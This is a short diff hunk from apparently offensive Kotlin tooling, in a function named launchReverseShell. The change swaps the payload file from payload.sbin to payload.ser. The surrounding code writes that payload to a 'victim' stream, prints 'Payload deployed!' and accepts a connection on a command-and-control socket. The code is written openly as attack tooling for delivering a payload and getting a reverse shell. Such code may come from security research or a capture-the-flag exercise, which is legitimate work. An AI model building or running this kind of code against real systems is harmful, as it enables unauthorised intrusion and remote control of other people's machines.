@@ -26,7 +26,7 @@ fun launchReverseShell(victimStream: OutputStream) {
     val deployment = thread {
         Thread.sleep(1000)
         // send payload to victim
-        victimStream.write(File("../payload.sbin").readBytes())
+        victimStream.write(File("../payload.ser").readBytes())
         println("Payload deployed!")
     }
     val victim = c2.accept()
